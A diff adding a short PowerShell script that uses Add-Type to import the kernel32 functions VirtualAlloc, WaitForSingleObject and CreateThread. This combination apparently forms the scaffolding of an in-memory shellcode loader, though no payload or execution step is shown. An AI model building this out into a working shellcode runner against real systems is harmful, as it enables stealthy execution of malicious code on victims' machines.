@@ -1,0 +1,35 @@
+$VrtAlloc = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
+}
+"@
+
+Add-Type $VrtAlloc 
+
+$WaitFor= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
+}
+"@
+
+Add-Type $WaitFor
+
+$CrtThread= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  
+}
+"@
+Add-Type $CrtThread
